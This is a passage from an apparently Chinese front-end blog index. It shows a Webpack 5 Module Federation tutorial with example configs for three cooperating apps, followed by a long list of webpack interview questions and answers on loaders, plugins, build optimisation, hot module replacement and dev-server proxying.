Chunk，但不同应用和项目间这个任务就变得困难了，我们几乎无法在项目之间做到按需热插拔。\n早期NPM方式共享模块   代码的共享是将依赖作为library安装到我们的项目里进行webpack打包并且构建上线对于项目 Home 与 Search，需要共享一个模块时，最常见的办法就是将其抽成通用依赖并分别安装在各自项目中。虽然 Monorepo 可以一定程度解决重复安装和修改困难的问题，但依然需要走本地编译。\n真正 Runtime 的方式可能是 UMD 方式共享代码模块，即将模块用 Webpack UMD模式打包，并输出到其他项目中。这是非常普遍的模块共享方式：对于项目 Home 与 Search，直接利用 UMD 包复用一个模块。但这种技术方案问题也很明显，就是包体积无法达到本地编译时的优化效果，且库之间容易冲突。\n微前端：micro-frontends (MFE) 也是最近比较火的模块共享管理方式，微前端就是要解决多项目并存问题，多项目并存的最大问题就是模块共享，模块之间是不能有冲突。  对于微前端我们还要考虑样式冲突，声明周期管理冲突等问题，我们先不考虑这些   想把问题聚焦在资源加载的方式上   微前端一般有两种打包方式：1.子应用独立打包，模块实现解耦，但这种方式无法抽取公共的依赖，2.整体应用打一个打包 很好的解决我们上面第一种方式的问题，但是打包效率速度实在是太慢了。不具备水平的扩展能力。由于微前端还要考虑样式冲突、生命周期管理，所以本文只聚焦在资源加载方式上。微前端一般有两种打包方式：\n\n子应用独立打包，模块更解耦，但无法抽取公共依赖等。\n整体应用一起打包，很好解决上面的问题，但打包速度实在是太慢了，不具备水平扩展能力。\n\n终于提到本文的主角了，模块联邦方式作为 Webpack5 内置核心特性之一的 FederatedModule：这个方案是直接将一个应用的包应用于另一个应用，同时具备整体应用一起打包的公共依赖抽取能力。  比如：我们直接可以在Search应用里直接使用已经发布到线上的Home应用的组件。\n应用案例本案例模拟三个应用： Nav 、 Search 及 Home 。每个应用都是独立的，又通过模块邦联系到了一起。比如Home需要使用Nav组件共享出来的header，Search可能要使用Header和Home组件构建出来的HomeList。模块联邦将他们共享的模块暴露出来进行引用。1、Nav 导航src&#x2F;header.js\nconst Header = () =&gt; &#123; const header = document.createElement(&#x27;h1&#x27;) header.textContent = &#x27;公共头部内容&#x27; return header&#125;export default Header\nsrc&#x2F;index.js\nimport Header from &#x27;./Header&#x27;const div = document.createElement(&#x27;div&#x27;)div.appendChild(Header())document.body.appendChild(div)\nwebpack.config.js\nconst HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;)const &#123; ModuleFederationPlugin&#125; = require(&#x27;webpack&#x27;).containermodule.exports = &#123; mode: &#x27;production&#x27;, entry: &#x27;./src/index.js&#x27;, plugins: [  new HtmlWebpackPlugin(),  new ModuleFederationPlugin(&#123;   // 模块联邦名字   name: &#x27;nav&#x27;,   // 外部访问的资源名字   filename: &#x27;remoteEntry.js&#x27;,   // 引用的外部资源列表   remotes: &#123;&#125;,   // 暴露给外部资源列表   exposes: &#123;    &#x27;./Header&#x27;: &#x27;./src/Header.js&#x27;,   // 暴露 Header组件  key：可以定义成./Header 这个./Header并不代表是我当前引用下的某个路径   而是将来在别人用的时候基于这个路径来拼接url，值是正真的我们本地项目的应用  &#125;,   // 共享模块，如lodash   shared: &#123;&#125;,   // 如果我们的 header模块里有共享的第三方模块比如：lodash等，我们可以把他放到这里在打包的时候可以把第三方的共享的模块打到单独的一个包里。 &#125;),]&#125;\n应用 webpack 运行服务：\n[felix] nav $ npx webpack serve --port 3003\n\n2、Home 首页src&#x2F;HomeList\nconst HomeList = (num) =&gt; &#123; let str = &#x27;&lt;ul&gt;&#x27; for (let i = 0; i &lt; num; i++) &#123;  str += &#x27;&lt;li&gt;item &#x27; + i + &#x27;&lt;/li&gt;&#x27;&#125; str += &#x27;&lt;/ul&gt;&#x27; return str&#125;export default HomeList\nsrc&#x2F;index.js\nimport HomeList from &#x27;./HomeList&#x27;remotes: &#123;    nav\t(&#x27;nav/Header&#x27;)：remotes: &#123; nav &#125;Header    exposes: &#123;./Header&#x27;:&#x27;&#x27;&#125;import(&#x27;nav/Header&#x27;).then((Header) =&gt; &#123;  //引用模块联邦的组件  这样导入别人组件的时候需要通过异步的方式因为 网络共享或者是模块载入 是由延迟的，所以要通过promise的方式（异步模块加载的形式）去引用它。 const body = document.createElement(&#x27;div&#x27;) body.appendChild(Header.default()) document.body.appendChild(body) document.body.innerHTML += HomeList(5)&#125;)\nwebpack.config.js\nconst HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;)const &#123; ModuleFederationPlugin&#125; = require(&#x27;webpack&#x27;).containermodule.exports = &#123; mode: &#x27;production&#x27;, entry: &#x27;./src/index.js&#x27;, plugins: [  new HtmlWebpackPlugin(),  new ModuleFederationPlugin(&#123;   name: &quot;home&quot;,   filename: &quot;remoteEntry.js&quot;,   remotes: &#123;    nav: &quot;nav@http://localhost:3003/remoteEntry.js&quot;,    // 引用第三方或别人写好的应用的路径。远端的服务路径  &#125;,   exposes: &#123;    &#x27;./HomeList&#x27;: &#x27;./src/HomeList.js&#x27;,  &#125;,   shared: &#123;&#125;, &#125;),]&#125;\n应用 webpack 运行服务：\n[felix] nav $ npx webpack serve --port 3001\n\n3、search 搜索src&#x2F;index\nPromise.all([import(&#x27;nav/Header&#x27;), import(&#x27;home/HomeList&#x27;)]).then(([&#123;  default: Header&#125;, &#123;  default: HomeList&#125;]) =&gt; &#123;  document.body.appendChild(Header())  document.body.innerHTML += HomeList(4)&#125;)\nwebpack.config.js\nconst HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;)const &#123; ModuleFederationPlugin&#125; = require(&#x27;webpack&#x27;).containermodule.exports = &#123; mode: &#x27;production&#x27;, entry: &#x27;./src/index.js&#x27;, plugins: [  new HtmlWebpackPlugin(),  new ModuleFederationPlugin(&#123;   name: &#x27;search&#x27;,   filename: &#x27;remoteEntry.js&#x27;,   remotes: &#123;    nav: &quot;nav@http://localhost:3003/remoteEntry.js&quot;,    home: &quot;home@http://localhost:3001/remoteEntry.js&quot;  &#125;,   exposes: &#123;&#125;,   shared: &#123;&#125;, &#125;),]&#125;\n应用 webpack 运行服务：\n[felix] nav $ npx webpack serve --port 3002","categories":["前端工程化"],"tags":["webpack"]},{"title":"webpack面试题总结","url":"/2020/12/03/webpack/webpack%E9%9D%A2%E8%AF%95%E9%A2%98/","content":"webpack 面试题\n一、 概念1. 什么是webpack，谈谈你对它的理解？是一个模块化打包工具，将不同的资源和文件，进行打包，合并在一个文件里。概念+打包流程+前端模块化1、依赖管理：方便引用第三方模块，让模块更容易复用、避免全局注入导致的冲突、、避免重复加载或者加载不必要的模块2、合并代码：把各个分散的模块集中打包成大文件，减少HTTP的链接的请求次数，配合uglify.js可以减少、优化代码的体积3、各种插件：babel把ES6+转化为ES5-，eslint可以检查编译时的各种错误\n(30条消息) 前端模块化理解perwhy_wang的博客-CSDN博客前端模块化的理解\n2. webpack的工作原理?工作原理概括基本概念在了解webpack原理前，需要掌握以下几个核心概念，以方便后面的理解：\n\nEntry:入口指示webpack以哪个文件为入口起点开始打包，分析构建内部依赖图\n\noutput:输出指示webpack的打包后的资源bundles输出到哪里去，以及如何命名\n\nLoader:让webpack能够去处理哪些非JavaScrip文件（webpack自身只理解javaScript)\n\nplugin:插件可以用于执行范围更广的任务。插件的范围包括，从打包优化和压缩，一直到重新定义环境中的变量等\n\nmode:模式指示webpack使用相应模式的配置\n流程概括webpack的运行流程是一个串行的过程，从启动到结束会依次执行以下流程：\n\n初始化参数：从配置文件和Shell语句中读取与合并参数，得出最终的参数；\n\n开始编译： 用上一步得到的参数初始化Complier对象，加载所有配置的插件，执行对象的run方法开始执行编译；\n\n确定入口： 根据配置中的entry找出所有入口文件；\n\n编译模块：从入口文件出发，调用所有配置的Loader对模块进行翻译，再找出该模块依赖的模块，再递归本步骤知道所有入口依赖的文件都经过了本步骤的处理；\n\n完成模块编译： 在经过第4步使用Loader翻译完所有模块后，得到了每个模块被翻译后的最终内容以及他们之间的依赖关系；\n\n输出资源：根据入口和模块之间的依赖关系，组装成一个个包含多个模块的Chunk，再把每个Chunk转换成一个单独的文件加入到输出列表，这步是可以修改输出内容的最后机会；\n\n输出完成： 在确定好输出内容后，根据配置确定输出的路径和文件名，把文件内容写入到文件系统。\n在以上过程中，webpack会在特定的时间点广播出特定的时间，插件在监听到感兴趣的时间后会执行特定的逻辑，并且插件可以调用Webpack提供的API改变Webpack的运行结果。\n流程细节Webpack的构建流程可以分为以下三个阶段：\n\n初始化：启动构建，读取与合并配置参数，加载Plugin，实例化Complier.\n\n编译：从Entry出发，针对每个Module串行调用对应的Loader去翻译文件内容，再找到该Module依赖的Module，递归地进行编译处理。\n\n输出： 对编译后的Module组合成Chunk，把Chunk转换成文件，输出到文件系统。如果只执行一次构建，以上阶段将会按照顺序各执行一次。但在开启监听模式下，流程将变为如下：\n\n\n3. webpack4和webpack5的区别？更快的构建速度更高的版本要求更灵活的模块组合更智能的缓存优化更小的体积webpack4 上需要下载安装 terser-webpack-plugin 插件webpack5 内部本身就自带 js 压缩功能，他内置了 terser-webpack-plugin 插件，我们不用再下载安装。而且在 mode&#x3D;“production” 的时候会自动开启 js 压缩功能。webpack4 缓存配置● npm install hard-source-webpack-plugin -Dwebpack5 缓存配置● webpack5 内部内置了 cache 缓存机制。直接配置即可。● cache 会在开发模式下被设置成 type： memory 而且会在生产模式把cache 给禁用掉。webpack4 启动服务● 通过 webpack-dev-server 启动服务webpack5 启动服务● 内置使用 webpack serve 启动，但是他的日志不是很好，所以一般都加都喜欢用 webpack-dev-server 优化。devtool的区别● sourceMap需要在 webpack.config.js里面直接配置 devtool 就可以实现了。而 devtool有很多个选项值，不同的选项值，不同的选项产生的 .map 文件不同，打包速度不同。● 一般情况下，我们一般在开发环境配置用“cheap-eval-module-source-map”，在生产环境用‘none’。v4: devtool: ‘cheap-eval-module-source-map’v5: devtool: ‘eval-cheap-module-source-map’打包：● webpack4打包:即使后续没有使用到num1的函数，依然会将代码打包进去● webpack5打包:后续没有使用到num1的函数，不会将代码打包进去输出代码：● webpack4只能输出es5的代码● webpack5新增属性output.ecmaVersion，可以生成ES5和ES6的代码\n4. 前端代码为何要进行构建和打包？\n代码方面体积更小，加载更快（tree-shaking，压缩合并）\ni. 编译高级语言和语法（ts，es6，模块化） ii. 兼容性和错误提示（polyfill，postcss，eslint）\n\n研发流程统一、高效的开发环境\ni. 统一的构建流程和产出标准 ii. 集成公司构建规范（提测，上线）\n\n打包之后许多零碎的文件打包成一个整体，页面只需请求一次，js文件中使用模块化互相引用，这样能在一定程度上提供页面渲染效率，打包的同时会进行编译，将es6，sass等高级语法进行转换编译，以兼容高版本的浏览器\n5. webpack的优缺点？优点：（1） webpack 是以 commonJS 的形式来书写脚本滴，但对 AMD&#x2F;CMD 的支持也很全面，方便旧项目进行代码迁移。（2）能被模块化的不仅仅是 JS 了。（3） 开发便捷，能替代部分 grunt&#x2F;gulp 的工作，比如打包、压缩混淆、图片转base64等。（4）扩展性强，插件机制完善缺点：● 配置复杂● 不分包bundle.js体积庞大● 只能用于采用模块化开发的项目● 打包慢● ES模块除Module外全用babel转换，但是一部分ES2015 语法的 firefox 与 chrome 浏览器中能直接跑的代码，无法用 webpack 编译\n6. 什么是bundle，什么是chunk，什么是modulebundle： 是由webpack打包出来的文件chunk： 是指webpack在进行模块依赖分析的时候，代码分割出来的代码块module： 是开发中的单个模块\n二、 loader1. Loader机制的作用是什么？webpack 本身只能处理 JavaScript 和 JSON 文件，而 loader 为 webpack 添加了处理其他类型文件的能力。webpack默认只能打包js文件，配置里的module.rules数组配置了一组规则，告诉 Webpack 在遇到哪些文件时使用哪些 Loader 去加载和转换打包成js。注意：use属性的值需要是一个由 Loader 名称组成的数组，Loader 的执行顺序是由后到前的；每一个 Loader 都可以通过 URL querystring 的方式传入参数，例如css-loader?minimize中的minimize告诉css-loader要开启 CSS 压缩。\n2. 有哪些常见的Loader？他们是解决什么问题的？● file-loader：把文件输出到一个文件夹中，在代码中通过相对 URL 去引用输出的文件● url-loader：和 file-loader 类似，但是能在文件很小的情况下以 base64 的方式把文件内容注入到代码中去● source-map-loader：加载额外的 Source Map 文件，以方便断点调试● image-loader：加载并且压缩图片文件● babel-loader：把 ES6 转换成 ES5● css-loader：加载 CSS，支持模块化、压缩、文件导入等特性● style-loader：把 CSS 代码注入到 JavaScript 中，通过 DOM 操作去加载 CSS。● eslint-loader：通过 ESLint 检查 JavaScript 代码\n3. Webpack 的 Loader 是什么？Webpack 只能理解 JavaScript 和 JSON 文件，这是 Webpack 开箱可用的自带能力。loader 可以让 Webpack 能够去处理其他类型的文件，比如 .scss 和 .ts，并将它们转换为有效的功能离散的 chunk 文件以供应用程序使用，以及被添加到依赖图中，也可将内联图像转换为 data URL。简单来说，loader 可以将一段代码转换成另一端代码，通常用来将一段特殊代码转换成一段浏览器可识别的代码。loader从下到上地取值(evaluate)&#x2F;执行(execute)，也就是是从后往前执行。在下面的示例中，从 ts-loader开始执行，然后继续执行 css-loader，最后以 raw-loader 为结束。loader 有两个属性：test，正则表达式，用于识别出哪些文件会被转换，use 定义在进行转换时应该使用哪个 loader，可以是字符串、数组和对象。\n三、 plugin1. Plugin（插件）的作用是什么？通过安装和配置第三方的插件，可以拓展 webpack 的能力，从而让 webpack 用起来更方便。最常用的webpack 插件有如下两个：① webpack-dev-server类似于 node.js 阶段用到的 nodemon 工具每当修改了源代码，webpack 会自动进行项目的打包和构建② html-webpack-pluginwebpack 中的 HTML 插件（类似于一个模板引擎插件）可以通过此插件自定制 index.html 页面的内容webpack-dev-server 可以让 webpack 监听项目源代码的变化，从而进行自动打包构建。运行如下的命令，即可在项目中安装webpack插件：npm install webpack-dev-server@3.11.0 -D\n下面进行webpack-dev-server配置，修改package.json -&gt; scripts中的dev命令：“scripts”:{“dev”：”webpack serve”，&#x2F;&#x2F; script 节点下的脚本,可以通过 npm run 执行}\n再次运行npm run dev 命令，重新进行项目的打包，在浏览器中访问http://localhost:8080 地址，查看自动打包效果，注意webpack-dev-server 会启动一个实时打包的http 服务器。\n2. 有哪些常见的Plugin？他们是解决什么问题的？● define-plugin：定义环境变量● commons-chunk-plugin：提取公共代码● uglifyjs-webpack-plugin：通过UglifyES压缩ES6代码● purgecss-webpack-plugin：擦除无用css● happypack：多线程处理打包● webpack-bundle-analyzer：打包分析● speed-measure-webpack-plugin：构建速度分析● html-webpack-plugin：● 为html文件中引入的外部资源如script、link动态添加每次compile后的hash，防止引用缓存的外部文件问题\n3. 是否写过Loader和Plugin？描述一下编写loader或plugin的思路？Loader像一个”翻译官”把读到的源文件内容转义成新的文件内容，并且每个Loader通过链式操作，将源文件一步步翻译成想要的样子。编写Loader时要遵循单一原则，每个Loader只做一种”转义”工作。 每个Loader的拿到的是源文件内容（source），可以通过返回值的方式将处理后的内容输出，也可以调用this.callback()方法，将内容返回给webpack。 还可以通过 this.async()生成一个callback函数，再用这个callback将处理后的内容输出出去。 此外webpack还为开发者准备了开发loader的工具函数集——loader-utils。相对于Loader而言，Plugin的编写就灵活了许多。 webpack在运行的生命周期中会广播出许多事件，Plugin 可以监听这些事件，在合适的时机通过 Webpack 提供的 API 改变输出结果。\n4. Webpack 的 Plugin 是什么？plugin是插件的意思，通常是用于对某个现有的架构进行扩展。webpack中的插件，就是对webpack现有功能的各种扩展，比如打包优化，文 件压缩等等。\n5. Loader和Plugin的不同？不同的作用● Loader直译为”加载器”。Webpack将一切文件视为模块，但是webpack原生是只能解析js文件，如果想将其他文件也打包的话，就会用到loader。 所以Loader的作用是让webpack拥有了加载和解析非JavaScript文件的能力。● Plugin直译为”插件”。Plugin可以扩展webpack的功能，让webpack具有更多的灵活性。 在 Webpack 运行的生命周期中会广播出许多事件，Plugin 可以监听这些事件，在合适的时机通过 Webpack 提供的 API 改变输出结果。不同的用法\n\nLoader在module.rules中配置，也就是说他作为模块的解析规则而存在。 类型为数组，每一项都是一个Object，里面描述了对于什么类型的文件（test），使用什么加载(loader)和使用的参数（options）\n\nPlugin在plugins中单独配置。 类型为数组，每一项是一个plugin的实例，参数都通过构造函数传入。\n6. 是否写过Loader和Plugin？描述一下编写loader或plugin的思路？Loader像一个”翻译官”把读到的源文件内容转义成新的文件内容，并且每个Loader通过链式操作，将源文件一步步翻译成想要的样子。\n编写Loader时要遵循单一原则，每个Loader只做一种”转义”工作。 每个Loader的拿到的是源文件内容（source），可以通过返回值的方式将处理后的内容输出，也可以调用this.callback()方法，将内容返回给webpack。 还可以通过 this.async()生成一个callback函数，再用这个callback将处理后的内容输出出去。 此外webpack还为开发者准备了开发loader的工具函数集——loader-utils。\n相对于Loader而言，Plugin的编写就灵活了许多。 webpack在运行的生命周期中会广播出许多事件，Plugin 可以监听这些事件，在合适的时机通过 Webpack 提供的 API 改变输出结果。\n\n\n四、 优化1、 如何提高webpack的构建速度？\n多入口情况下，使用CommonsChunkPlugin来提取公共代码\n通过externals配置来提取常用库利用DllPlugin和DllReferencePlugin预编译资源模块 通过DllPlugin来对那些我们引用但是绝对不会修改的npm包来进行预编译，再通过DllReferencePlugin将预编译的模块加载进来。\n使用Happypack 实现多线程加速编译\n使用webpack-uglify-parallel来提升uglifyPlugin的压缩速度。 原理上webpack-uglify-parallel采用了多核并行压缩来提升压缩速度\n使用Tree-shaking和Scope Hoisting来剔除多余代码\n\n2、 如何利用webpack来优化前端性能？（提高性能和体验）!前端性能优化方案都有哪些？ - 知乎 (zhihu.com)(30条消息) 前端性能优化的方法_万般皆是你的博客-CSDN博客用webpack优化前端性能是指优化webpack的输出结果，让打包的最终结果在浏览器运行快速高效。● 压缩代码。删除多余的代码、注释、简化代码的写法等等方式。可以利用webpack的UglifyJsPlugin和ParallelUglifyPlugin来压缩JS文件， 利用cssnano（css-loader?minimize）来压缩css● 利用CDN加速。在构建过程中，将引用的静态资源路径修改为CDN上对应的路径。可以利用webpack对于output参数和各loader的publicPath参数来修改资源路径● 删除死代码（Tree Shaking）。将代码中永远不会走到的片段删除掉。可以通过在启动webpack时追加参数–optimize-minimize来实现● 提取公共代码。● 异步组件● 异步图片● 配置webpack对小图片打包成base64字符 减少io请求\n3、 怎么配置单页应用？怎么配置多页应用？单页应用可以理解为webpack的标准模式，直接在entry中指定单页应用的入口即可，这里不再赘述多页应用的话，可以使用webpack的 AutoWebPlugin来完成简单自动化的构建，但是前提是项目的目录结构必须遵守他预设的规范。\n4、 如何提升webpack的运行速度(开发环境) ,有哪些策略？多入口情况下，使用CommonsChunkPlugin来提取公共代码通过externals配置来提取常用库利用DllPlugin和DllReferencePlugin预编译资源模块 通过DllPlugin来对那些我们引用但是绝对不会修改的npm包来进行预编译，再通过DllReferencePlugin将预编译的模块加载进来。使用Happypack 实现多线程加速编译使用webpack-uglify-parallel来提升uglifyPlugin的压缩速度。 原理上webpack-uglify-parallel采用了多核并行压缩来提升压缩速度使用Tree-shaking和Scope Hoisting来剔除多余代码● JS代码压缩● terser是一个JavaScript的解释、绞肉机、压缩机的工具集，可以帮助我们压缩、丑化我们的代码，让bundle更小。在production模式下，webpack 默认就是使用 TerserPlugin 来处理我们的代码的。如果想要自定义配置它，配置方法如下。● TerserPlugin常用的属性如下： - extractComments：默认值为true，表示会将注释抽取到一个单独的文件中，开发阶段，我们可设置为 false ，不保留注释 - parallel：使用多进程并发运行提高构建的速度，默认值是true，并发运行的默认数量： os.cpus().length - 1 - terserOptions：设置我们的terser相关的配置： compress：设置压缩相关的选项，mangle：设置丑化相关的选项，可以直接设置为true mangle：设置丑化相关的选项，可以直接设置为true toplevel：底层变量是否进行转换keep_classnames：保留类的名称 keep_fnames：保留函数的名称● 代码压缩● cssCSS压缩通常用于去除无用的空格等，不过因为很难去修改选择器、属性的名称、值等，所以我们可以使用另外一个插件：css-minimizer-webpack-plugin● Html文件代码压缩● 文件大小压缩● 对文件的大小进行压缩，可以有效减少http传输过程中宽带的损耗，文件压缩需要用到 compression-webpack-plugin插件● 图片压缩● 如果我们对bundle包进行分析，会发现图片等多媒体文件的大小是远远要比 js、css 文件要大的，所以图片压缩在打包方面也是很重要的\n● Tree Shaking● Tree Shaking 是一个术语，在计算机中表示消除死代码，依赖于ES Module的静态语法分析。在webpack实现Trss shaking有两种不同的方案： - usedExports：通过标记某些函数是否被使用，之后通过Terser来进行优化的 - sideEffects：跳过整个模块&#x2F;文件，直接查看该文件是否有副作用● usedExports的配置方法很简单，只需要将usedExports设为true即可，如下。而sideEffects则用于告知webpack compiler在编译时哪些模块有副作用，配置方法是在package.json中设置sideEffects属性。如果sideEffects设置为false，就是告知webpack可以安全的删除未用到的exports，如果有些文件需要保留，可以设置为数组的形式。● 代码分离■ 默认情况下，所有的JavaScript代码（业务代码、第三方依赖、暂时没有用到的模块）在首页全部都加载，就会影响首页的加载速度。如果可以分出出更小的bundle，以及控制资源加载优先级，从而优化加载性能。■ 代码分离可以通过splitChunksPlugin来实现，该插件webpack已经默认安装和集成，只需要配置即可。■ splitChunks有如下几个属性： - Chunks：对同步代码还是异步代码进行处理 - minSize： 拆分包的大小, 至少为minSize，如何包的大小不超过minSize，这个包不会拆分 - maxSize： 将大于maxSize的包，拆分为不小于minSize的包 - minChunks：被引入的次数，默认是1● 内联 chunk■ 可以通过InlineChunkHtmlPlugin插件将一些chunk的模块内联到html，如runtime的代码（对模块进行解析、加载、模块信息相关的代码），代码量并不大但是必须加载的，比如：总结一下，Webpack对前端性能的优化，主要是通过文件体积大小入手，主要的措施有分包、减少Http请求次数等。\n用webpack优化前端性能是指优化webpack的输出结果，让打包的最终结果在浏览器运行快速高效。1、压缩代码:删除多余的代码、注释、简化代码的写法等等方式。可以利用webpack的 UglifyJsPlugin 和 ParallelUglifyPlugin 来压缩JS文件， 利用 cssnano （css-loader? minimize）来压缩css2、利用CDN加速: 在构建过程中，将引用的静态资源路径修改为CDN上对应的路径。可以利用 webpack对于 output 参数和各loader的 publicPath 参数来修改资源路径3、Tree Shaking: 将代码中永远不会走到的片段删除掉。可以通过在启动webpack时追加参数 — optimize-minimize 来实现4、Code Splitting: 将代码按路由维度或者组件分块(chunk),这样做到按需加载,同时可以充分利用浏览 器缓存5、提取公共第三方库: SplitChunksPlugin插件来进行公共模块抽取,利用浏览器缓存可以长期缓存这 些无需频繁变动的公共代码\n5、 npm打包时需要注意哪些？如何利用webpack来更好的构建？● Npm是目前最大的 JavaScript 模块仓库，里面有来自全世界开发者上传的可复用模块。你可能只是JS模块的使用者，但是有些情况你也会去选择上传自己开发的模块。关于NPM模块上传的方法可以去官网上进行学习，这里只讲解如何利用webpack来构建。● NPM模块需要注意以下问题：要支持CommonJS模块化规范，所以要求打包后的最后结果也遵守该规则。Npm模块使用者的环境是不确定的，很有可能并不支持ES6，所以打包的最后结果应该是采用ES5编写的。并且如果ES5是经过转换的，请最好连同SourceMap一同上传。Npm包大小应该是尽量小（有些仓库会限制包大小）发布的模块不能将依赖的模块也一同打包，应该让用户选择性的去自行安装。这样可以避免模块应用者再次打包时出现底层模块被重复打包的情况。UI组件类的模块应该将依赖的其它资源文件，例如.css文件也需要包含在发布的模块里。\n6、 什么是长缓存？在webpack中如何做到长缓存优化？● 浏览器在用户访问页面的时候，为了加快加载速度，会对用户访问的静态资源进行存储，但是每一次代码升级或者更新，都需要浏览器去下载新的代码，最方便和最简单的更新方式就是引入新的文件名称。● 在webpack中，可以在output给出输出的文件制定chunkhash，并且分离经常更新的代码和框架代码，通过NameModulesPlugin或者HashedModulesPlugin使再次打包文件名不变。\n7、 在项目中tree-shaking摇树不是很干净，有什么解决方案？在webpack.config.js中通过来进行tree-shaking 但是单单指定这一个配置 不是很干净有些模块导入，只要被引入，就会对应用程序产生重要的影响。一个很好的例子就是全局样式表，或者设置全局配置的JavaScript 文件。如何告诉 Webpack 你的代码无副作用，可以通过 package.json 有一个特殊的属性sideEffects，就是为此而存在的。它有三个可能的值：● true：如果不指定其他值的话。这意味着所有的文件都有副作用，也就是没有一个文件可以 tree-shaking。● false： 告诉 Webpack 没有文件有副作用，所有文件都可以 tree-shaking。● 数组[…]：是文件路径数组。它告诉 webpack，除了数组中包含的文件外，你的任何文件都没有副作用。因此，除了指定的文件之外，其他文件都可以安全地进行 tree-shaking。\n8、 怎么提高webpack的打包效率？(29条消息) 提高webpack的打包速度方法孙德海想进阿里的博客-CSDN博客提升webpack打包速度如何提高webpack的构建速度 - 简书 (jianshu.com)开发环境优化\n\n开启热模块替换（HMR）\n\n使用 source-map 进行源代码映射\n\n将只需要被loader执行一次的规则放到 oneOf 里面去生产环境优化\n\n对资源进行缓存\n\n使用tree shaking（树摇）\n\n使用code split 进行代码分割\n\n文件懒加载和预加载\n\n多进程打包\n\n使用PWA（离线加载）\n\n使用externals 忽略某些包，然后通过cdn引入\n\n使用dll 技术对某些库（第三方库）进行单独打包\n9、 按需加载的原理● 使用符合 ECMAScript 提案 的 import() 语法\n● 使用 webpack 特定的 require.ensure\n10、 预获取&#x2F;预加载模块Webpack v4.6.0+ 增加了对预获取和预加载的支持。\n在声明 import 时，使用下面这些内置指令，可以让 webpack 输出 “resource hint(资源提示)”，来告知浏览器\n● prefetch(预获取)：将来某些导航下可能需要的资源\n● preload(预加载)：当前导航下可能需要资源\n添加第二句魔法注释： webpackPrefetch: true\n告诉 webpack 执行预获取。这会生成 \n并追加到页面头部，指示着浏览器在闲置时间预取 math.js 文件。\n\n11、 懒加载懒加载或者按需加载，是一种很好的优化网页或应用的方式。这种方式实际上是先把\n你的代码在一些逻辑断点处分离开，然后在一些代码块中完成某些操作后，立即引用\n或即将引用另外一些新的代码块。这样加快了应用的初始加载速度，减轻了它的总体\n体积，因为某些代码块可能永远不会被加载。\n创建一个 math.js 文件，在主页面中通过点击按钮调用其中的函数：\nbutton.addEventListener(‘click’, () &#x3D;&gt; {\nimport(&#x2F;\n webpackChunkName: ‘math’ \n&#x2F; ‘.&#x2F;math.js’).then(({ add\n}) &#x3D;&gt; {\nconsole.log(add(4, 5))\n})\n})\n\n\n这里有句注释，我们把它称为 webpack 魔法注释： webpackChunkName: ‘math’ ,告诉webpack打包生成的文件名为 math 。第一次加载完页面， math.bundle.js 不会加载，当点击按钮后，才加载math.bundle.js 文件。\n\n什么是Tree-sharking?Tree是树，sharking是摇晃的意思。那么树摇晃的时候，肯定会’摇’下来一些无用的叶子。从编程的角度思考，如果假设我们的代码是一棵树（Tree），那么摇下来的无用的的叶子是什么呢？当然是无用的代码啦，他有个专业的术语，叫做dead-code（死码）指打包中去除那些引入了但在代码中没用到的死代码。在wepack中js treeshaking通过UglifyJsPlugin来进行，css中通过purify-CSS来进行。\n\n五、 构建流程1. webpack的构建流程是什么?从读取配置到输出文件这个过程尽量说全Webpack 的运行流程是一个串行的过程，从启动到结束会依次执行以下流程：\n\n初始化参数：从配置文件和 Shell 语句中读取与合并参数，得出最终的参数；\n开始编译：用上一步得到的参数初始化 Compiler 对象，加载所有配置的插件，执行对象的 run 方法开始执行编译；\n确定入口：根据配置中的 entry 找出所有的入口文件；\n编译模块：从入口文件出发，调用所有配置的 Loader 对模块进行翻译，再找出该模块依赖的模块，再递归本步骤直到所有入口依赖的文件都经过了本步骤的处理；\n完成模块编译：在经过第4步使用 Loader 翻译完所有模块后，得到了每个模块被翻译后的最终内容以及它们之间的依赖关系；\n输出资源：根据入口和模块之间的依赖关系，组装成一个个包含多个模块的 Chunk，再把每个 Chunk 转换成一个单独的文件加入到输出列表，这步是可以修改输出内容的最后机会；\n输出完成：在确定好输出内容后，根据配置确定输出的路径和文件名，把文件内容写入到文件系统。在以上过程中，Webpack 会在特定的时间点广播出特定的事件，插件在监听到感兴趣的事件后会执行特定的逻辑，并且插件可以调用 Webpack 提供的 API 改变 Webpack 的运行结果。\n\n2. 解决ESLint报错常用的五种方案（1）Strings must use singlequote quotes表示变量使用了双引号，把表示变量的双引号改为单引号即可。（2）Expected to be enclosed by double quotes (vue&#x2F;html-quotes)这个报错代表让你要将单引号改为双引号（3）Trailing spaces not allowed no-trailing-spaces代表有的地方空格多余，比如标签结尾处，只要删除多余空格即可（4）Unexpected tab character’面意思理解呢就是意想不到的制表符，当时出现的时候就是我习惯的使用Tab键去打空格，但是eslint默认不认可Tab，所以解决方法很简单：在eslint的配置文件中（.eslintrc）rules项中添加一行：“no-tabs”:“off”。如下：（5）‘expected indentation of 2 spaces but found 1 tab’字面意思就是预期缩进2个空格，但找到1个Tab。说实话，我一开始找了半天，没发现原因，后来想到可能是eslint不认可tab开头，因此我找到了我使用的编辑器VSCord的设置，添加了相应的文字：\n大概的意思就是在格式话保存的时候按照1tab&#x3D;2space的计算量将tab替换成space，这样就不会有问题了。（6）Unexpected trailing comma. (comma-dangle)字面意思是尾随了一个多余的逗号（7）There should be no space before this paren space-in-parens结尾有多余的空格，去掉就好。\n3. 什么是模块热更新？有什么优点？HMR即Hot Module Replacement是指当你对代码修改并保存后，webpack将会对代码进行重新打包，并将改动的模块发送到浏览器端，浏览器用新的模块替换掉旧的模块，去实现局部更新页面而非整体刷新页面。借助webpack.HotModuleReplacementPlugin()，devServer开启hot场景1：实现只刷新css，不影响js场景2：js中实现热更新，只更新指定js模块优点：在开发阶段，可以提高开发效率，不用手动重新编译即可看到最新效果，webpack服务会通知页面驱动试图进行更新，不用在浏览器手动进行刷新页面\n4. Webpack Proxy工作原理4.1 代理在项目开发中不可避免会遇到跨越问题，Webpack中的Proxy就是解决前端跨域的方法之一。所谓代理，指的是在接收客户端发送的请求后转发给其他服务器的行为，webpack中提供服务器的工具为webpack-dev-server。4.1.1 webpack-dev-serverwebpack-dev-server是 webpack 官方推出的一款开发工具，将自动编译和自动刷新浏览器等一系列对开发友好的功能全部集成在了一起。同时，为了提高开发者日常的开发效率，只适用在开发阶段。在webpack配置对象属性中配置代理的代码如下：&#x2F;&#x2F; .&#x2F;webpack.config.jsconst path &#x3D; require(‘path’)\nmodule.exports &#x3D; 